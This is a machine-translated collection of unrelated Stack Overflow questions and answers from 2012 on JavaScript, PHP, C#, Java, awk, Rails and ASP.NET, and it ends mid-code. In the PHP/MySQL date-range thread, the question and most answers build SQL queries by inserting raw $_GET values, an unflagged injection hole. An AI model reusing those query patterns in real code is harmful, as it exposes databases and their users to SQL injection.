现在，我的代码替换了表格的所有 innerHTML 元素。基本上，在对 JS 数组进行排序之后，它会触及表的每个节点，重写它的 innerHTML 值。我觉得可能有一种更有效的方法可以做到这一点，但我想不出。

编辑：

这是执行上述算法的第 (3) 部分的代码。我编辑了不相关的部分（只是一些字符串转换）。索引有点奇怪，因为我在将表格转换为数组时跳过了标题行，所以我在重写表格时对此进行了补偿。

```
for (var i = 0; i < numRows-1; i++){
 for (var j = 0; j < numCols; j++){
        var arrCell = tableArr[i][cols[j]];
        tableEl.rows[i+1].cells[j].innerHTML = arrCell;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-08-15T04:16:57.167

您可以从 DOM 中删除行，进行排序，然后将它们添加回 DOM。

```
var tbody = table.tBodies[0];

var placeholder = document.createElement('tbody');
table.replaceChild(placeholder, tbody);

//sort rows in tbody

table.replaceChild(tbody, placeholder); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-08-13T04:38:19.677

使用数组对值进行排序，并使用文档片段来执行更新。

```
function sortRows(tbody, compare, sortDesc) {
    //convert html collection to array
    var rows = [].slice.call(tbody.rows);
    //sort to desired order
    rows.sort(compare);
    if (sortDesc) {
        rows.reverse();
    }
    //update table
    var fragment = document.createDocumentFragment();
    rows.forEach(function (row) {
        fragment.appendChild(row);
    });
    tbody.appendChild(fragment);
} 
```

复杂性将在比较功能中。您将需要考虑列索引以及所需的任何类型转换和缓存。

这是一个将单元格文本内容转换为整数的基本示例。

```
function sortTable(table, columnIndex) {
    while (table && table.tagName !== 'TABLE') {
        table = table.parentNode;
    }
    if (table) {
        sortRows(table.tBodies[0], function compare(topRow, bottomRow) {
            var topValue = parseInt(topRow.cells[columnIndex].textContent, 10);
            var bottomValue = parseInt(bottomRow.cells[columnIndex].textContent, 10);
            return (topValue - bottomValue);
        });
    }
}

function sortRows(tbody, compare, sortDesc) {
    //convert html collection to array
    var rows = [].slice.call(tbody.rows);
    //sort to desired order
    rows.sort(compare);
    if (sortDesc) {
        rows.reverse();
    }
    //update table
    var fragment = document.createDocumentFragment();
    rows.forEach(function (row) {
        fragment.appendChild(row);
    });
    tbody.appendChild(fragment);
}
```

```
<table>
    <thead>
        <tr><th onclick="sortTable(this, 0)">Sort</th><th onclick="sortTable(this, 1)">Sort</th></tr>
    </thead>
    <tbody>
        <tr><td>1</td><td>25</td></tr>
        <tr><td>3</td><td>12</td></tr>
        <tr><td>2</td><td>40</td></tr>
        <tr><td>10</td><td>25</td></tr>
    </tbody>
</table>
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:38:48.723

您可以使用[jQuery](http://www.jquery.com)及其[Datatables 插件](http://datatables.net/)。在您的数据表语句中，您可以添加

`"bSort": true`

并且这项工作将由脚本完成。虽然如果你能找到一个纯 JS 的方式，我建议你使用它，这样你就不会给你的网页增加无用的重量。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:36:28.687

**如果数据存储在服务器上 - 我会使用排序类型（ASC、DESC 等）向服务器发送 Ajax 请求，对服务器上的数据进行排序**（使用 PHP 等），然后在JavaScript 并全新编写表。

# vim - 是否有任何 CoffeeScript 格式化程序 Vim 插件？

> ID：11866836
> 
> 赞同：2
> 
> 时间：2012-08-08T14:33:39.420
> 
> 标签：vim, coffeescript, formatter

我最近开始在 Vim 中编写 CoffeeScript。

在编写 JS 代码时，有一个名为[Jsbeautify](http://www.vim.org/scripts/script.php?script_id=2727)的插件可以帮助格式化 JS 代码。

我注意到有些 IDE 具有某种针对 CoffeeScript 的格式化功能，但我想知道是否有类似的 Vim 插件也可以格式化 CoffeeScript。

有人有一些建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:06:07.250

谷歌，搜索结果 1。

[https://github.com/kchmck/vim-coffee-script/](https://github.com/kchmck/vim-coffee-script/)

说它处理缩进。

# c# - 罗技鼠标触发Control.OnKeyDown？

> ID：11866837
> 
> 赞同：0
> 
> 时间：2012-08-08T14:33:42.700
> 
> 标签：c#, mousewheel, onkeydown, logitech

在我的 C# 应用程序中，我处理`CTRL`和`SHIFT`in`OnKeyDown`如下所示。它按预期工作。但是，当我按下 Logitech M705 上的中间按钮时，我会收到一系列不需要的按键事件。*两者都* `foo()`被`bar()`调用，这显然是不受欢迎的行为。（我想驱动程序会生成几个按键来激活一些特殊的缩放工具？）

**问：**如何检测这些模拟按键？`OnKeyDown`或者，在这种特殊情况下如何防止被调用？

```
protected override void OnKeyDown(System.Windows.Forms.KeyEventArgs e)
{
    if (e.KeyCode == Keys.ShiftKey)
        foo();
    else if (e.KeyCode == Keys.ControlKey)
        bar();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:36:52.880

在我看来，您的罗技驱动程序有一个特定的组合键宏绑定到您的中键单击。由于驱动程序有意模拟键盘输入，我不确定是否可以过滤掉“假”按键。

# php - 套接字发送并检查php中的用户登录？

> ID：11866838
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:33:44.150
> 
> 标签：php

首先，我想检查用户是否登录。如果没有，用户应该被重定向到 login.php 页面。

其次，我想在 PHP 中发送一个套接字。What I would like to happen is when the mute button is selected, a message is sent to the computer instructing it to do so.

这样做的目的是针对我正在创建的应用程序，但我不确定如何继续。

```
<?php 

//session_start();

include("helper/DBOperation.php");

$dbObj = new DBOperation();

include("helper/check_user_login.php");

checkUserIsLogin();

?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:53:10.123

对于套接字部分，我建议您使用 Node.js 和 Socket.io 等 JavaScript 技术。以下是文档的链接：[节点文档](http://nodejs.org) [socket.io](https://github.com/learnboost/socket.io/wiki/)

这适用于 PHP 网站，因为您可以在客户端代码上使用 JavaScript。您将在运行 Apache 服务器的计算机上的另一个端口上运行节点服务器。但问题是我不确定您是否可以从节点服务器访问系统的音量控制。如果您需要静音的 html5 视频，您可以使用 JavaScript 来实现。

让我知道这是否对您有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:44:37.717

我猜你是新手。

1.  用户是否登录由您决定。假设使用基于 Web 的技术，您需要阅读有关 PHP 会话、HTML 身份验证、SSL 等的信息。

2.  在您的情况下，需要阅读一个[套接字。](http://en.wikipedia.org/wiki/Network_socket)去谷歌上查询。

3.  在创建这个应用程序之前做一点播放和背景阅读

4.  当您对问题区域有了更好的了解时，请与我们联系。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:41:36.093

你需要做的是：

在 DBOperation.php 中，第 264 行显示：

```
$data_provided = "not enough at all"; 
```

将其更改为：

```
$data_provided = "provide enough, so that others can figure out what is going on"; 
```

此外，在函数 checkUserIsLogin 中，请注意以下几行：

```
function checkUserIsLogin()
{
  /*
specify what sending a socket to PHP means, and also what is the role of the mute button selection in the grand theme of things*/

 if($data_provided == "not enough at all")
    die("Sorry, too little data, please provide more information..");
} 
```

# c++ - Boost Spirit Classic - 微型 SQL 解析器

> ID：11866840
> 
> 赞同：0
> 
> 时间：2012-08-08T14:33:48.107
> 
> 标签：c++, boost-spirit

我是新来的，以提高精神和玩弄 microSQL-Parser。
无法解析带引号的字符串，例如：`'It's driving me crazy'` 在具有以下语法定义的示例中：

```
string_literal = lexeme_d[ch_p( '\'' ) >> +(anychar_p - ch_p( '\'' )) 
                       >> ch_p( '\'' )] ; 
```

我已经尝试了很多，但找不到正确的方法。有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T20:15:46.423

上面的代码对应于正则表达式：（`'[^']+'` 它不会匹配空字符串`''`，但这是另一个问题）。

引号通过将它们加倍嵌入到 SQL 字符串中，因此您实际上想要将字符串提供给它：`'It''s driving me crazy'`并且您可以使用正则表达式：`'(''|[^'])*'`

对应于以下代码：

```
string_literal = lexeme_d[ch_p('\'') >>
    *(ch_p('\'') >> ch_p('\'') || +(anychar_p - ch_p('\''))) >>
    ch_p('\'')]; 
```

# javascript - 在 HTML5 中浏览和播放视频

> ID：11866841
> 
> 赞同：0
> 
> 时间：2012-08-08T14:33:50.780
> 
> 标签：javascript, html, html5-video

要在 HTML5 网络播放器中观看视频，我们需要在 HTML 代码中添加视频源，如下所示：

```
 <video id="example" class="video" controls preload="none" width="500" height="300"
  poster="abc.jpg" data-setup="{}">
        <source src="../87D645D1d01.ogv" type='video/ogg' /> 
 </video> 
```

那么，有什么方法可以让我们在本地文件系统中浏览媒体文件，而不管操作系统如何，然后将 pah 添加到 SRC：视频元素的一部分，就像我们在任何基于桌面的视频播放器中那样，然后播放它？

问候。阿努杰。

# java - 是否可以在 Java 中修改文本文件的某些行，而不会覆盖所有内容

> ID：11866849
> 
> 赞同：0
> 
> 时间：2012-08-08T14:34:10.517
> 
> 标签：java, file-io

我有一个文本文件。我只想修改该文件中某处的一行。我不想覆盖文件的其他行（在大文件上非常慢）。

我不是指可以在末尾“添加”行的*附加模式；*而是“编辑”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:38:13.893

您可以使用 RandomAccessFile 执行此操作。你更改更改第一行的内容。

您不能做的是插入或删除任何字节，因为这需要您从执行此操作的位置转移所有数据。（如果这接近文件的末尾，它可能比重写所有内容要快得多）

RandomAccessFile 也很难使用，`char`因为它是为与`byte`s一起使用而设计的

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:38:42.397

您的标题说明“某行” - 您的问题正文说明“第一行”。修改第一行*要*简单得多，因为您不需要找到该行的起始字节。您可以使用[`RandomAccessFile`](http://docs.oracle.com/javase/7/docs/api/java/io/RandomAccessFile.html)覆盖文件的相关块。

但是，新行的大小必须与旧行相同（以字节为单位）。如果新行中的有​​用数据比旧行中的短，您需要弄清楚如何填充它。如果新行需要*比*旧行长，则必须创建一个新文件，并适当地复制数据。

通常，文件系统不支持在现有文件中插入或删除。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T15:00:09.313

您可以这样做（这绝不是最佳代码）。

```
import java.io.*;

public class Test {
    // provide the file name via the command line
    public static void main(String []args) throws Exception {
        BufferedReader br = new BufferedReader(new FileReader("your_file_name_here")); // used for reading the file
        BufferedWriter bw = new BufferedWriter(new FileWriter("new_file_name_here.txt"));
        String str = br.readLine();
        while (str != null) {
            // modify the line here if you want, otherwise it will written as is.
            // then write it using the BufferedWriter
            bw.write(str, 0, str.length());
            bw.newLine();
            // read the next line
            str = br.readLine();
        }
        br.close();
        bw.close();
    }
} 
```

# unit-testing - 如何捕获（在 Fiddler 中）由 Nancy.Testing.Browser 发出的 HTTP 请求

> ID：11866851
> 
> 赞同：0
> 
> 时间：2012-08-08T14:34:16.220
> 
> 标签：unit-testing, fiddler, nancy

我有以下 NancyFX 单元测试。

```
var browser = new Browser(new UnitTestBootstrapper());
var response = browser.Post("/login", with =>
    {
        with.FormValue("UserName", userName);
        with.FormValue("Password", password);
    });

response.ShouldHaveRedirectedTo("/home"); 
```

您可以看到我使用`Nancy.Testing.Browser`POST 一些表单值的实例。我想在 Fiddler 中捕获这个 Http 请求，但我不确定如何设置浏览器（也许是代理？）

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:01:02.810

你不能，因为他们从来没有访问过网络；这就是浏览器类的全部意义 - 为您提供端到端测试，而无需使用托管/http/networking/浏览器呈现的性能损失/配置问题。

如果您想通过网络堆栈，请使用 Selenium 之类的东西，或者启动一个自我主机并使用 EasyHttp 或手动使用 HttpClient 戳它。

# unix - 您如何跳过带有 awk 的最后一行？

> ID：11866860
> 
> 赞同：18
> 
> 时间：2012-08-08T14:34:57.373
> 
> 标签：unix, awk

我正在用 awk 处理一个文件，需要跳过一些行。互联网上没有一个好的答案。

到目前为止，我拥有的唯一信息是您可以通过以下方式跳过一个范围：

```
awk 'NR==6,NR==13 {print}' input.file 
```

或者

```
awk 'NR <= 5 { next } NR > 13 {exit} { print}' input.file 
```

您可以通过输入以下内容跳过第一行：

```
awk 'NR < 1 { exit } { print}' db_berths.txt 
```

你如何跳过最后一行？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-08T14:48:16.403

一种使用方式`awk`：

```
awk 'NR > 1 { print prev } { prev = $0 }' file.txt 
```

或者更好`sed`：

```
sed '$d' file.txt 
```

* * *

## 回答 #2

> 赞同：-4
> 
> 时间：2012-08-08T15:18:18.527

你可以试试：

```
awk 'END{print NR}' file 
```

# ruby-on-rails - 如何在不破坏记录的情况下删除用户关联？

> ID：11866862
> 
> 赞同：1
> 
> 时间：2012-08-08T14:35:00.990
> 
> 标签：ruby-on-rails, ruby

我的联想有困难，一直在四处寻找与我的问题相关的答案。我的表单中有一个选择框，可以在创建研究时将用户添加到研究中。问题是，如果我编辑列表并从研究中删除用户，然后将其添加回来，则会删除他们的答案。我仍在学习 RoR，并被赋予了让一些现有代码以这种方式运行的任务。研究模型通过答案有很多用户，那么如何在不删除答案的情况下编辑研究用户？我的表格：

```
= select_tag("users[]", options_for_select(@users.collect { |ff| [ff.full_name, ff.id] }, @study.users.collect { |fs| fs.id }), | {:multiple=>true, :id => "users"})                                                                                      | 
```

我的研究.rb：

```
has_many :users, :through => :answers
has_many :answers, :group => :grouping_number
accepts_nested_attributes_for :answers 
```

我的用户.rb

```
has_many :answers
has_many :studies, :through => :answers 
```

我的答案.rb

```
belongs_to :user
belongs_to :study
belongs_to :question 
```

我意识到这可能是我忽略的一些简单的事情，当花太长时间看某样东西时通常会出现这种情况，但任何朝着正确方向的点都会非常感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:46:46.097

您可能会从使用像**[act_as_paranoid](https://github.com/technoweenie/acts_as_paranoid)**[这样的软删除 gem](https://www.ruby-toolbox.com/categories/Active_Record_Soft_Delete)中受益。

这样，关联将保持不变，但被标记为已删除，而不是实际从数据库中删除。这样做的好处是即使在他们的学习关联被“删除”后，您仍然可以查询用户答案的​​活动记录，而实际上已从应用程序中删除的关联行为将保持不变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:49:30.790

用户只有在给出答案的情况下才能属于一项研究，这有意义吗？我会以某种方式假设一个独立的关系 UserStudies。在您的情况下，作为一个单独的模型，而不仅仅是 has_and_belongs_to_many 关系。这将允许您在此模型中拥有一个“活动”标志，从而激活或停用关系。然后，您只需将条件添加到您的 belongs_to 关联。

这大致就是像 Deefour 已经推荐的那些宝石会做的事情。

# php - 当我向其中添加日期范围时，我的查询将不起作用。使用 php 和 MySQL

> ID：11866863
> 
> 赞同：1
> 
> 时间：2012-08-08T14:35:01.433
> 
> 标签：php, mysql

我目前在一个表单中有多个搜索字段，用户可以选择并选择要过滤的一个，在我添加日期范围之前一切正常。如果我单独添加日期范围而没有任何其他字段来过滤它，那么我知道这并不是我写错了查询。请帮我解决这个问题。谢谢！

这是有效的查询：（由于某种原因，SELECT * 不起作用，我必须输入我要显示的所有字段的名称）

它包括包含日期范围的表单部分。

```
<li class="form-line form-line-column" id="id_29">
    <label class="form-label-top" id="label_29" for="input_30">
        From Date:
    </label>
    <div id="cid_29" class="form-input-wide">
        <input type="text" class="form-textbox validate" id="datepicker" name="from_date" size="10" />
    </div>
</li>
<li class="form-line form-line-column" id="id_29">
    <label class="form-label-top" id="label_29" for="input_8">
        To Date:
    </label>
    <div id="cid_29" class="form-input-wide">
        <input type="text" class="form-textbox validate" id="datepicker2" name="to_date" size="10" />
    </div>
</li> 

<?php
    $sso = $_GET['sso'];
    $assigned_to = $_GET['assigned_to'];
    $case_status = $_GET['case_status'];
    $startdate = $_GET['from_date'];
    $enddate = $_GET['to_date'];
    $subject = $_GET['subject'];

    $sql = ("SELECT 
                id, sso, full_name, case_status, assigned_to, resolution, 
                description, updated, created, additional_notes, subject
            FROM rmstable2
            WHERE 
                sso LIKE '%$sso%' AND
                case_status LIKE '%$case_status%' AND
                assigned_to LIKE '%$assigned_to%' AND
                subject LIKE '%$subject%'");
?> 
```

这是我想要的查询：

```
<?php
    $sql = ("SELECT 
                id, sso, full_name, case_status, assigned_to, resolution, 
                description, updated, created, additional_notes, subject
             FROM rmstable2
             WHERE 
                sso LIKE '%$sso%' AND
                case_status LIKE '%$case_status%' AND
                assigned_to LIKE '%$assigned_to%' AND
                subject LIKE '%$subject%'
                AND created >= '$startdate'
                AND created <= '$enddate'");
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:42:12.197

使用`BETWEEN`它，不要忘记用`DATE( )`

```
$sql = ("SELECT id, sso, full_name, case_status, assigned_to, 
                resolution, description, updated, created, 
                additional_notes, subject 
        FROM  rmstable2 
        WHERE sso LIKE '%$sso%' AND 
              case_status LIKE '%$case_status%' AND 
              assigned_to LIKE '%$assigned_to%' AND 
              subject LIKE '%$subject%' AND 
              DATE(created) BETWEEN DATE('$startdate') AND DATE('$enddate')"); 
```

**更新 1**

换成怎么`AND`样`OR`

```
$sql = ("SELECT id, sso, full_name, case_status, assigned_to, 
                resolution, description, updated, created, 
                additional_notes, subject 
        FROM  rmstable2 
        WHERE sso LIKE '%$sso%' OR 
              case_status LIKE '%$case_status%' OR
              assigned_to LIKE '%$assigned_to%' OR 
              subject LIKE '%$subject%' OR
              (DATE(created) BETWEEN DATE('$startdate') AND DATE('$enddate'))"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:40:22.303

最佳实践是 `echo $sql;` 在 phpmyadmin 中使用并粘贴生成的查询（如果你有的话）！其他有用的命令是`echo mysql_error()`.

在您的情况下，您很可能必须检查日期格式是否正确（应该是 YYYY-MM-DD）

也做这个 `AND created >= '$startdate' AND created <= '$enddate'");`

对此 `AND created >= '" . $startdate . "' AND created <= '" . $enddate . "'");`

因为如果...

```
$a=1;
echo '$a'; 
```

将输出

```
$a 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:44:02.213

假设您的值格式正确，您可以尝试在最终查询中使用 DATE(created)，例如：

```
AND DATE(created) >= '$startdate' AND DATE(created) <= '$enddate' 
```

甚至使用 BETWEEN 例如：

```
AND DATE(created) BETWEEN '$startdate' AND '$enddate' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:44:27.670

```
// assuming date is like YYYY-MM-DD, or you can explode the time to create an timestamp
// assuming your date field in the database is date
// you can remove FROM_UNIXTIME if your field is not date

$startdate = strtotime($_GET['from_date']);
$enddate = strtotime($_GET['to_date']);

$addQuery = "";

if(isset($startdate)){
     $addQueryStart = "created >= FROM_UNIXTIME($startdate)";
}
if(isset($startdate)){
     $addQueryEnd = "created <= FROM_UNIXTIME($enddate)";
}

if(isset($startdate) && isset($enddate)){
    $addQuery .= "AND (".$addQueryStart." AND ".$addQueryEnd.")";
} elseif(isset($startdate) && !isset($enddate)){
    $addQuery .= "AND ".$addQueryStart;
} elseif(!isset($startdate) && isset($enddate)){
    $addQuery .= "AND ".$addQueryEnd;
}

$sql = "
    SELECT id, sso, full_name, case_status, assigned_to, resolution, description, updated, created, additional_notes, subject 
    FROM rmstable2 
    WHERE 
        sso LIKE '%$sso%' AND 
        case_status LIKE '%$case_status%' AND 
        assigned_to LIKE '%$assigned_to%' AND 
        subject LIKE '%$subject%' ".$addQuery; 
```

后期编辑：针对不同情况

# asp.net - ASP.NET WebForms：为什么用户控件中的相对路径在本地工作，但在部署时却不行？

> ID：11866865
> 
> 赞同：2
> 
> 时间：2012-08-08T14:35:16.343
> 
> 标签：asp.net, user-controls, relative-path

**重写问题**

在我的一生中，我无法让相对图像路径在使用 VS 的开发服务器和发布到远程 IIS 服务器之间的用户控件中始终如一地工作。我不想通过添加使我的图像成为服务器标签`runat="server"`。我希望它是严格的客户端，我不想使用任何 hocus pocus 代码黑客。我想解决断开连接，所以这是我的问题：

我的图像存储在`~/images`. 我的用户控件存储在`~/usercontrols/anothersubfolder`.

当我这样做...

`<img id="myimage" src="../../Images/help.png" alt="" />`

...图像在使用 VS 开发服务器 (localhost) 时加载，但在我部署到远程 IIS 虚拟目录时加载。但是，当我这样做时...

`<img id="myimage" src="<%=Request.ApplicationPath %>/Images/help.png" alt="" />`

...当我远程发布但不使用开发服务器时它可以工作！

我需要一个适用于 VS 开发服务器和远程发布时的解决方案。正如我所说，我不想添加`runat="server"`到我的图像标签或使用任何代码黑客。这里有一个断开连接，我想知道如何解决这个问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:44:44.190

试试这样：

```
<img src="~/Images/indicator.gif" border="0" alt="" runat="server" /> 
```

[避免 ASP.NET 中的相对和绝对 URL 问题](http://weblogs.asp.net/fmarguerie/archive/2004/05/05/avoiding-problems-with-relative-and-absolute-urls-in-asp-net.aspx)

[Control.ResolveUrl 与 Control.ResolveClientUrl 与 VirtualPathUtility.ToAbsolute](https://stackoverflow.com/questions/518199/control-resolveurl-versus-control-resolveclienturl-versus-virtualpathutility-toa)

[ResolveUrl 与 ResolveClientUrl](http://www.andornot.com/blog/post/ResolveUrl-vs-ResolveClientUrl.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-12T11:27:35.830

正如其他人已经回答的那样，包含它的页面正在加载用户控件“.ascx”，顺便说一句，它与母版页是一样的——它们是由页面加载的。因此，您在脚本中描述的任何相对路径都相对于页面的位置。

因此，放置 `<img id="myimage" src="~/Images/help.png" alt="" runat="server" />`或简单地使用服务器端控件进行图像处理，将从技术上解决您的问题..

但是据我了解，您的问题不像您可能知道的那样技术性强。
所以剩下的假设是，您的问题在将简单的 html 控件变形为您所描述的“代码破解”方面更具概念性。

您必须掌握有关使用 asp.net 的“标准”，
并且要做到这一点，您首先需要了解 asp.net 是一个旨在在服务器端生成页面然后交付这个**新创建的动态生成页面**的系统到客户端 - 这是使用 asp.net 的主要好处，也是它的最高原则！
这就是为什么您在 asp.net 中的页面不是 .html 的原因 - 它是 .aspx，即使稍后生成的脚本只是 html。

因此，如果您同意我前面的段落，您也了解您创建的任何 .aspx 页面在交付之前都由您的服务器处理，并且您放入其中的脚本标签只是关于如何动态处理它的一组指令。添加 runat="server" 仅表示在生成的 html 页面的生成过程中，脚本标签的属性和内容需要服务器端特别注意。

您在 VS 中拥有的 aspx 页面和为您的浏览器生成的 aspx 页面不是同一个实体。
runat="server" 永远不会出现在交付给客户端的脚本中。

**在 asp.net 中编写脚本不是编写 html - 它是编写元指令，旨在影响生成的 html 将包含的内容。**

我希望到目前为止，我已经说服您使用提供的最佳技术解决方案作为 asp.net 中的正常和自然标准，而不会感到悲伤或遗憾。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T20:21:00.597

您似乎找到了自己的答案：ascx 控件的位置不会改变相对路径。加载 ascx 控件的 aspx 页面最终确定了路径（这将扩展到您的 CSS 和 JS 文件，如果您正在使用任何文件）。

我通过从不使用相对路径来“解决”这个问题。我的`src`属性总是看起来像`<img src="/<appfolder>/Images/<filename>.<extension> />`。

值得注意的是，我更改了我的网站属性，并在属性页面的 Web 选项卡下选择了**使用本地 IIS Web 服务器。**由于我不使用 Visual Studio 开发服务器，因此您的里程可能会根据您的项目配置而有所不同。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-07-04T13:15:19.207

```
<img id="myimage" src='<%= ResolveUrl("~/src/....") %>'/> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-08T14:45:05.097

当您在本地运行它时，您正在使用您创建的文件夹并且您正在使用它，发布后您的控件可能最终位于由 VS 创建的控件文件夹中，并且带有 2 个文件夹的原始文件结构消失了。发布后检查文件系统并重新排序您的工作文件夹。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-08T15:57:32.010

用户控件中的相对路径是相对于它们出现的页面，而不是用户控件的位置。我相信这基本上就是您在更新中所说的。

您应该将您的更新发布为答案并接受它，或者接受我的答案，以您的偏好为准:)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-08-16T07:11:39.027

就像另一种可能性一样，默认情况下在 IIS 上禁用 ASP 父路径，这可能是您的问题的原因吗？

[这篇](http://www.iis.net/learn/application-frameworks/running-classic-asp-applications-on-iis-7-and-iis-8/classic-asp-parent-paths-are-disabled-by-default)文章讨论了如果是这样的话如何解决这个问题。基本上，您可以通过多种方式解决它，但最简单的方法是进入 IIS 站点上的 ASP 设置并重新启用父路径。

# c# - C# - 菜单条查询

> ID：11866866
> 
> 赞同：0
> 
> 时间：2012-08-08T14:35:18.500
> 
> 标签：c#, menu, strip, menustrip

我有两个关于 Windows 窗体菜单条的问题：

**1.如何强制表单始终显示辅助键？** 目前，仅当按下 Alt 键时才会显示字母下划线。

**2\. 下拉菜单的命令是什么？** 通常在用户单击菜单按钮或使用键盘导航后菜单会下拉，但我想通过按下界面按钮来使菜单下拉，但我不知道该怎么做。我尝试摆弄 DropDown 属性，但没有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:38:39.850

1.  AFAIK，在 C# 中不*容易*做到这一点。最简单的方法是更改​​ Windows 设置。在 Windows 7 上：
    *   转到控制面板
    *   *轻松访问中心*
    *   *使键盘更易于使用*
    *   检查*下划线键盘快捷键和访问键*。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T15:51:58.613

1.  使用 ToolStripMenuItem，您需要查看三个属性： ShortcutKeyDisplayString ShortcutKeys ShowShortcutKeys

    *   虽然这三个应用于根菜单项，比如文件或帮助，您将无法看到快捷方式，但是您应该能够启用 ShortcutKeys，将 ShowShortcutKeys 设置为 true 并且无需修改 ShortcutKeyDisplayString 让它们出现在子 ToolStripMenuItem 的旁边.
2.  您在 ToolStripMenuItem 上查找的方法是[ShowDropDown()](http://msdn.microsoft.com/en-us/library/system.windows.forms.toolstripdropdownitem.showdropdown.aspx)，执行此方法将下拉菜单。

例子：

```
((ToolStripMenuItem)FileMenu.Items[0]).ShowDropDown(); 
```

# javascript - 数组的加权平均值

> ID：11866869
> 
> 赞同：1
> 
> 时间：2012-08-08T14:35:24.223
> 
> 标签：javascript, average, weighted

我必须在 JavaScript 中编写以下加权平均公式：

> 平均值 = (p1*p2*x1 + p3*p4*x2 + ... +p(n-2)*p(n-1)*xn) / (p1*p2 + p3*p4 + ... + p (n-2)p(n-1) )

该公式给出了值的平均值`x`。

我还使用JavaScript`array`填充了`n`元素：

```
Array = (p1,p2,x1,p3,p4,x2....) 
```

...我想找到平均值`pi`的权重和值在哪里。`xi`

如何使用此数组编写公式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:43:57.997

我可能会使用以下策略：

*   创建两个新数组（可能是`weights`和`values`）。
*   以 3 步迭代原始数组；乘以`pn`'s 并将结果推入`weights`并推`xn`入`values`。
*   迭代新数组，创建加权总数（除法的左侧）和总权重（除法的右手）。
*   一个一个地分开。完毕。

换句话说，是这样的：

```
function weighted_average(input) {
    var weights = [];
    var values = [];
    var weighted_total = 0;
    var total_weight = 0;;

    if (input.length % 3 !== 0) {
        throw new Error("Input array length is not a multiple of 3.");
    }

    for (var i = 0; i < input.length; i += 3) {
        weights.push(input[i] * input[i + 1]);
        values.push(input[i + 2]);
    }

    for (var i = 0; i < weights.length; i += 1) {
        weighted_total += weights[i] * values[i];
        total_weight += weights[i];
    }

    return weighted_total / total_weight;
} 
```

不过，您必须验证这是否完全符合您的要求。没有保证。;)

JSFiddle 演示：[jsfiddle.net/Z8seZ](http://jsfiddle.net/Z8seZ/)

当然，您可以跳过中间数组以使其更快一些。但是上面的内容更明确，更易读，因此更易于维护（例如，您可以轻松拆分实际算法并为不同形式的输入创建不同的“包装器”函数）。如果使用（真正的）大型数据集，我只会优化它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T15:24:20.473

这是一种需要 ES5 的函数式方法：

```
var w = a.unzip(3).map(function(v, i, a) {
    var weight = v[0] * v[1];
    var sum = weight * v[2];
    return [sum, weight];
}).reduce(function(p, c, i, a) {
    return [p[0] + c[0], p[1] + c[1]];
}, [0, 0]);

var aw = w[0] / w[1]; 
```

在伪代码中是：

```
split the array into chunks of three
convert each three [p1, p2, x ] into a pair [ p1 * p2 * x , p1 * p2 ]
sum the pairs (along the array, not within each pair)
divide one by the other 
```

`unzip`以及将数组分块的（非标准）函数在哪里：

```
Object.defineProperty(Array.prototype, 'unzip', {
    value: function(n) {
        n = n || 2;
        return this.reduce(function(p, c, i, a) {
            if (i % n === 0) {
                p.push(a.slice(i, i + n));
            }
            return p;
        }, []);
    }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-10-02T15:56:37.460

`xs`ES6 one-liner，用于包含键`w`作为权重和`v`值的对象数组：

```
((_w, _v) => _v / _w)(...xs.reduce((r, o) => [r[0] + o[w], r[1] + o[w] * o[v]], [0, 0])) 
```

# c# - 使用 listView 两次和三次显示相同的消息

> ID：11866871
> 
> 赞同：0
> 
> 时间：2012-08-08T14:35:30.273
> 
> 标签：c#

我正在尝试在其中添加角色的列表视图中工作。我有防止列表视图具有重复角色的验证方法。问题是当我选择 listView 的另一个列表项时它会抛出两次相同的消息，而当我选择列表视图的滚动条时它会抛出三次相同的消息。我认为以错误的方式使用 listView.BeginEdit()。请 ！帮我解决这个问题

代码 ：

```
private void AddDefaultRoles()
{
    ListViewItem lvi = new ListViewItem("Reader");
    listViewRoles.Items.Add(lvi);

    lvi = new ListViewItem("Writer");
    listViewRoles.Items.Add(lvi);

    lvi = new ListViewItem("Administrator");
    listViewRoles.Items.Add(lvi);

    lvi = new ListViewItem("Delete");
    listViewRoles.Items.Add(lvi);

    lvi = new ListViewItem("Admin");
    listViewRoles.Items.Add(lvi);

    lvi = new ListViewItem("Contributor");
    listViewRoles.Items.Add(lvi);

    lvi = new ListViewItem("Designer");
    listViewRoles.Items.Add(lvi);
}

